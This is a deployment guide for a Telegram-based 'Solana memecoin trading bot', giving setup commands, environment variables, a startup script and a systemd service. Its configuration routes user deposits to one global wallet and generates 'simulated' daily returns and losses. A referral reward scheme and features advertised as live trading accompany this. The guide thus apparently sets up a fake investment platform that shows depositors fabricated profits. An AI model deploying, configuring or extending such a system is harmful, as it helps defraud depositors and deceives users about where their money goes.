# Solana Memecoin Trading Bot - AWS Deployment Guide

A sophisticated Telegram-integrated cryptocurrency trading platform specializing in Solana blockchain transaction tracking with dynamic wallet management and advanced real-time performance analytics.

## Quick Start - AWS Deployment

### 1. Server Setup Commands
```bash
# Update system packages
sudo apt update && sudo apt upgrade -y

# Install Python 3.11 and pip
sudo apt install python3.11 python3.11-pip python3.11-venv git -y

# Clone your repository
git clone <your-repo-url> /home/ubuntu/solana-memecoin-bot
cd /home/ubuntu/solana-memecoin-bot

# Make startup script executable
chmod +x start_aws.sh
```

### 2. Python Environment Setup
```bash
# Create virtual environment
python3.11 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

### 3. Environment Variables Setup
Create `.env` file with these variables:

```bash
# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your_bot_token_here
ADMIN_USER_ID=your_admin_user_id_here

# Database Configuration 
DATABASE_URL=postgresql://username:password@host:port/database?sslmode=require

# Bot Settings
MIN_DEPOSIT=0.5
GLOBAL_DEPOSIT_WALLET=your_solana_wallet_address_here
SUPPORT_USERNAME=YourSupportUsername

# Session Secret for Flask (generate a strong random key)
SESSION_SECRET=your_super_secret_session_key_here_change_in_production

# Production Environment Flag
BOT_ENVIRONMENT=aws
NODE_ENV=production

# Optional: Logging Level
LOG_LEVEL=INFO
```

### 4. Database Setup
```bash
# Setup database tables
python -c "from app import app, db; app.app_context().push(); db.create_all(); print('Database setup complete')"
```

### 5. Service Installation (Systemd)
```bash
# Copy service file
sudo cp solana-memecoin-bot.service /etc/systemd/system/

# Reload systemd and enable service
sudo systemctl daemon-reload
sudo systemctl enable solana-memecoin-bot
sudo systemctl start solana-memecoin-bot

# Check service status
sudo systemctl status solana-memecoin-bot
```

### 6. Manual Start (Testing)
```bash
# For testing before service installation
./start_aws.sh
```

## AWS Start Command (Copy & Paste Ready)

```bash
#!/bin/bash
# AWS Deployment Startup Script
# Make this file executable: chmod +x start_aws.sh

echo "Starting Solana Memecoin Bot on AWS..."

# Ensure we're in the correct directory
cd "$(dirname "$0")"

# Load environment variables
if [ -f .env ]; then
    echo "Loading environment variables from .env"
    export $(cat .env | grep -v ^# | xargs)
else
    echo "Warning: .env file not found"
fi

# Set production environment
export BOT_ENVIRONMENT=aws
export NODE_ENV=production

# Install/update dependencies if needed
if [ -f requirements.txt ]; then
    echo "Installing Python dependencies..."
    pip install -r requirements.txt
fi

# Run database migrations if needed
echo "Setting up database..."
python -c "from app import app, db; app.app_context().push(); db.create_all(); print('Database setup complete')"

# Start the Flask application
echo "Starting Flask application..."
gunicorn --bind 0.0.0.0:5000 --workers 2 --timeout 120 --keep-alive 5 main:app &

# Start the Telegram bot
echo "Starting Telegram bot..."
python bot_v20_runner.py &

# Wait for all background processes
wait

echo "Application started successfully!"
```

## Environment Variables (Copy & Paste Ready)

```bash
# ==========================================
# COMPLETE ENVIRONMENT VARIABLES FOR AWS
# ==========================================

# Telegram Bot Configuration (REQUIRED)
TELEGRAM_BOT_TOKEN=your_telegram_bot_token_from_botfather
ADMIN_USER_ID=your_telegram_user_id_for_admin_access

# Database Configuration (REQUIRED)
DATABASE_URL=postgresql://username:password@host:port/database?sslmode=require

# Bot Core Settings
MIN_DEPOSIT=0.5
GLOBAL_DEPOSIT_WALLET=your_solana_wallet_address_for_deposits
SUPPORT_USERNAME=your_support_telegram_username

# Flask Security (REQUIRED)
SESSION_SECRET=generate_a_strong_random_key_here_32_chars_minimum

# Environment Flags
BOT_ENVIRONMENT=aws
NODE_ENV=production
LOG_LEVEL=INFO

# Optional Advanced Settings
MAX_DEPOSIT=5000
SOLANA_NETWORK=mainnet-beta
SOLANA_RPC_URL=https://api.mainnet-beta.solana.com
DEFAULT_WALLET=2pWHfMgpLtcnJpeFRzuRqXxAxBs2qjhU46xkdb5dCSzD

# ROI Configuration
SIMULATED_DAILY_ROI_MIN=0.5
SIMULATED_DAILY_ROI_MAX=2.2
SIMULATED_LOSS_PROBABILITY=0.15

# Notification Settings
DAILY_UPDATE_HOUR=9
```

## Python Dependencies (requirements.txt)

```
flask>=2.3.0
flask-sqlalchemy>=3.0.0
python-telegram-bot>=20.0
python-dotenv>=1.0.0
psycopg2-binary>=2.9.0
gunicorn>=21.0.0
sqlalchemy>=2.0.0
requests>=2.31.0
schedule>=1.2.0
pillow>=10.0.0
qrcode>=7.4.0
aiohttp>=3.8.0
trafilatura>=1.6.0
psutil>=5.9.0
alembic>=1.12.0
email-validator>=2.0.0
werkzeug>=2.3.0
```

## Systemd Service File (Copy & Paste Ready)

```ini
[Unit]
Description=Solana Memecoin Trading Bot
After=network.target
Wants=network.target

[Service]
Type=forking
User=ubuntu
Group=ubuntu
WorkingDirectory=/home/ubuntu/solana-memecoin-bot
Environment=BOT_ENVIRONMENT=aws
Environment=NODE_ENV=production
EnvironmentFile=/home/ubuntu/solana-memecoin-bot/.env
ExecStart=/home/ubuntu/solana-memecoin-bot/start_aws.sh
ExecReload=/bin/kill -HUP $MAINPID
KillMode=mixed
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

## Verification Commands

### Check Environment Loading
```bash
python -c "from dotenv import load_dotenv; load_dotenv(); import os; print('Bot Token:', 'LOADED' if os.getenv('TELEGRAM_BOT_TOKEN') else 'MISSING')"
```

### Run Deployment Checklist
```bash
python aws_deployment_checklist.py
```

### View Service Logs
```bash
# Real-time logs
sudo journalctl -u solana-memecoin-bot -f

# Recent logs
sudo journalctl -u solana-memecoin-bot --no-pager -l

# Service status
sudo systemctl status solana-memecoin-bot
```

### Test Database Connection
```bash
python -c "from app import app, db; app.app_context().push(); print('Database connected:', db.engine.execute('SELECT 1').scalar() == 1)"
```

## Complete Installation Script (Copy & Paste)

```bash
#!/bin/bash
# Complete AWS Installation Script

echo "=== Solana Memecoin Bot AWS Installation ==="

# Update system
sudo apt update && sudo apt upgrade -y

# Install dependencies
sudo apt install python3.11 python3.11-pip python3.11-venv git -y

# Create application directory
sudo mkdir -p /home/ubuntu/solana-memecoin-bot
cd /home/ubuntu/solana-memecoin-bot

# Setup Python environment
python3.11 -m venv venv
source venv/bin/activate

# Install Python dependencies
pip install -r requirements.txt

# Make scripts executable
chmod +x start_aws.sh

# Setup systemd service
sudo cp solana-memecoin-bot.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable solana-memecoin-bot

echo "Installation complete! Please:"
echo "1. Create .env file with your configuration"
echo "2. Start service: sudo systemctl start solana-memecoin-bot"
echo "3. Check status: sudo systemctl status solana-memecoin-bot"
```

## Troubleshooting Commands

### Service Management
```bash
# Start service
sudo systemctl start solana-memecoin-bot

# Stop service
sudo systemctl stop solana-memecoin-bot

# Restart service
sudo systemctl restart solana-memecoin-bot

# Check service status
sudo systemctl status solana-memecoin-bot

# Enable auto-start
sudo systemctl enable solana-memecoin-bot
```

### Log Analysis
```bash
# View all logs
sudo journalctl -u solana-memecoin-bot

# View recent logs
sudo journalctl -u solana-memecoin-bot -n 50

# Follow logs in real-time
sudo journalctl -u solana-memecoin-bot -f

# View logs with specific time
sudo journalctl -u solana-memecoin-bot --since "1 hour ago"
```

### Process Management
```bash
# Check if processes are running
ps aux | grep python
ps aux | grep gunicorn

# Kill stuck processes
sudo pkill -f bot_v20_runner.py
sudo pkill -f gunicorn

# Check port usage
sudo netstat -tlnp | grep :5000
```

## Key Features

- **Real-time Solana blockchain monitoring**
- **Advanced wallet management system**
- **Telegram bot integration with admin controls**
- **Live trading position tracking**
- **Automated ROI calculations**
- **Referral system with rewards**
- **Performance analytics dashboard**
- **Secure deposit/withdrawal system**

## Security Notes

1. **Generate strong SESSION_SECRET**: Use a 32+ character random string
2. **Secure database credentials**: Use strong passwords and SSL connections
3. **Limit admin access**: Only add trusted Telegram IDs to ADMIN_USER_ID
4. **Monitor logs regularly**: Check for unauthorized access attempts
5. **Keep dependencies updated**: Regularly update requirements.txt packages

## Support

For technical support or deployment assistance, contact the support team through the configured SUPPORT_USERNAME in Telegram.